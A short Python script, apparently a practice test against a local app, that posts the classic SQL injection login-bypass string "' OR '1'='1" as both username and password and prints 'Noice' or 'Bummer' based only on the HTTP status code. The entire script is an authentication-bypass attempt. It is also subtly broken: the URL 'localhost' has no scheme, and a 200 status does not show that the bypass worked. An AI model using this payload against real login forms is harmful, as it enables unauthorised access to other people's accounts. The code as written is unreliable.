import requests

url = 'localhost'

sql_injection_payload = "' OR '1'='1"
response = requests.post(url, data={'username': sql_injection_payload, 'pass': sql_injection_payload})

if response.status_code == 200:
    print('Noice')
else:
    print('Bummer')